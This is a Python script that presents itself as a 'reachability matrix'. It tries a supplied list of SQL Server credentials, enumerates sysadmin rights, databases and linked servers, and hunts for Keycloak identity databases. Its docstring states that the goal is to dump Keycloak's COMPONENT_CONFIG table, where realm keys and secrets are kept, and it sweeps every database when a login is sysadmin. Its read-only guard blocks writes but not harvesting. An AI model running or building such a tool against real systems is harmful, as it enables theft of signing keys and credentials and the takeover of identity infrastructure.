#!/usr/bin/env python3
"""Fleet reachability matrix + Keycloak identity-DB locator.

SELECT-only. Payload: env PAYLOAD_B64 = b64(json list of
{server,database,user,password,tag,timeout?}).

Per credential:
  connect -> identity/sysadmin -> sys.databases -> sys.servers (linked)
  -> best-effort connect to each visible db -> look for Keycloak schema
  -> if COMPONENT_CONFIG exists anywhere, SELECT it immediately (that is the goal).
"""
import base64
import json
import os
import re
import sys
import time

import pyodbc

FORBIDDEN = re.compile(
    r"(?is)\b(insert|update|delete|drop|alter|create|truncate|merge|exec|execute|"
    r"grant|revoke|deny|backup|restore|dbcc|shutdown|reconfigure|xp_|sp_configure|"
    r"sp_add|sp_password|into\s+)\b")
SAFE_IDENT = re.compile(r"^[A-Za-z0-9_@#$][A-Za-z0-9_@#$ ]{0,120}$")

IDENT_DB = re.compile(r"(?i)(keycloak|identit|^auth|_auth|auth_|kc[_-]|sso|idp|"
                      r"openid|login|iam|directory|users)")

CONN = ("DRIVER={ODBC Driver 18 for SQL Server};SERVER=tcp:%s,1433;DATABASE=%s;"
        "UID=%s;PWD=%s;Encrypt=yes;TrustServerCertificate=yes;Connect Timeout=%d")


def guard(sql):
    if FORBIDDEN.search(sql):
        raise ValueError("guard: non-select rejected")
    return sql


def connect(srv, db, user, pwd, timeout=12):
    return pyodbc.connect(CONN % (srv, db, user, pwd, timeout), timeout=timeout, readonly=True)


def classify(err):
    s = str(err)
    low = s.lower()
    if "40615" in s or "not allowed to access the server" in low:
        return "FIREWALL_40615"
    if "18456" in s or "login failed" in low:
        return "AUTH_18456"
    if "4060" in s or "cannot open database" in low:
        return "NO_DB_4060"
    if "timeout" in low or "hyt00" in low or "hyt01" in low:
        return "TIMEOUT"
    if "name or service not known" in low or "getaddrinfo" in low or "nodename" in low:
        return "DNS"
    return "ERR"


def rows_of(cur, sql, cap=600):
    cur.execute(guard(sql))
    if cur.description is None:
        return []
    cols = [d[0] for d in cur.description]
    out = []
    for i, r in enumerate(cur.fetchall()):
        if i >= cap:
            break
        out.append({c: (None if v is None else str(v)[:3000]) for c, v in zip(cols, r)})
    return out


SCHEMA_HUNT = (
    "SELECT TABLE_SCHEMA AS sch, TABLE_NAME AS tbl FROM INFORMATION_SCHEMA.TABLES "
    "WHERE TABLE_NAME IN ('COMPONENT_CONFIG','COMPONENT','COMPONENT_CONFIG_JSON') "
    "OR TABLE_NAME LIKE 'REALM%' OR TABLE_NAME LIKE 'CLIENT%' OR TABLE_NAME LIKE 'USER_ENTITY%' "
    "OR TABLE_NAME LIKE 'CREDENTIAL%' OR TABLE_NAME LIKE 'KEY%' ORDER BY TABLE_NAME")


def probe_db(srv, db, user, pwd, timeout):
    rec = {"db": db}
    try:
        cn = connect(srv, db, user, pwd, timeout)
    except Exception as e:
        rec["status"] = classify(e)
        rec["err"] = str(e)[:160]
        return rec
    rec["status"] = "SUCCESS"
    try:
        cur = cn.cursor()
        try:
            rec["schema_hits"] = rows_of(cur, SCHEMA_HUNT)
        except Exception as e:
            rec["schema_hits"] = {"error": str(e)[:120]}
        hits = [h for h in (rec.get("schema_hits") or []) if isinstance(h, dict)]
        cc = [h for h in hits if h.get("tbl") == "COMPONENT_CONFIG"]
        if cc:
            sch = cc[0].get("sch")
            try:
                rec["component_config"] = rows_of(
                    cur, "SELECT * FROM [%s].[COMPONENT_CONFIG]" % sch, cap=4000)
            except Exception as e:
                rec["component_config"] = {"error": str(e)[:160]}
        # keycloak 17 also keeps realm keys under KEYCLOAK_ROLE etc; grab table count per schema
        if hits:
            try:
                rec["db_size"] = rows_of(
                    cur, "SELECT COUNT(*) AS n FROM INFORMATION_SCHEMA.TABLES")
            except Exception:
                pass
    finally:
        try:
            cn.close()
        except Exception:
            pass
    return rec


def main():
    payload = json.loads(base64.b64decode(os.environ["PAYLOAD_B64"]).decode())
    os.makedirs("/tmp/out", exist_ok=True)
    report = {"generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "results": []}

    for idx, item in enumerate(payload):
        srv, db, user = item["server"], item["database"], item["user"]
        tmo = int(item.get("timeout") or 12)
        rec = {"idx": idx, "server": srv, "database": db, "user": user,
               "tag": item.get("tag"), "sections": {}}
        print("=== CONN %d ===" % idx, flush=True)
        try:
            cn = connect(srv, db, user, item["password"], tmo)
        except Exception as e:
            rec["connect_status"] = classify(e)
            rec["connect_error"] = str(e)[:220]
            print("CONNFAIL %s" % rec["connect_status"], flush=True)
            report["results"].append(rec)
            continue
        rec["connect_status"] = "SUCCESS"
        print("CONNECTED", flush=True)
        try:
            cur = cn.cursor()
            for name, sql in (
                ("whoami", "SELECT SUSER_SNAME() AS login_name, DB_NAME() AS db, "
                           "IS_SRVROLEMEMBER('sysadmin') AS sysadmin, USER_NAME() AS db_user"),
                ("version", "SELECT @@VERSION AS v"),
                ("databases", "SELECT name, state_desc, create_date FROM sys.databases ORDER BY name"),
                ("linked", "SELECT name, product, data_source FROM sys.servers"),
                ("roles", "SELECT r.name AS role FROM sys.database_principals p "
                          "JOIN sys.database_role_members m ON m.member_principal_id=p.principal_id "
                          "JOIN sys.database_principals r ON r.principal_id=m.role_principal_id "
                          "WHERE p.name=SUSER_SNAME()"),
            ):
                try:
                    rec["sections"][name] = rows_of(cur, sql)
                    print("OK %s" % name, flush=True)
                except Exception as e:
                    rec["sections"][name] = {"error": str(e)[:160]}
                    print("ERR %s" % name, flush=True)

            names = [d["name"] for d in (rec["sections"].get("databases") or [])
                     if isinstance(d, dict) and d.get("name")]
            cand = [n for n in names if IDENT_DB.search(n)]
            rec["db_candidates"] = cand
            rec["db_probe"] = [probe_db(srv, n, user, item["password"], min(tmo, 10))
                               for n in cand[:12] if n != db]
            # full sweep only when the credential is sysadmin
            is_sa = any(isinstance(w, dict) and str(w.get("sysadmin")) == "1"
                        for w in (rec["sections"].get("whoami") or []))
            rec["sysadmin"] = is_sa
            if is_sa:
                rec["db_probe_all"] = [probe_db(srv, n, user, item["password"], min(tmo, 10))
                                       for n in names[:40] if n != db]
            for p in (rec.get("db_probe") or []) + (rec.get("db_probe_all") or []):
                print("DB %s" % p["status"], flush=True)
                if p.get("component_config"):
                    print("COMPONENT_CONFIG_FOUND", flush=True)
        finally:
            try:
                cn.close()
            except Exception:
                pass
        report["results"].append(rec)

    with open("/tmp/out/sql-matrix.json", "w") as f:
        json.dump(report, f, indent=1)
    print("REPORT_DONE", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
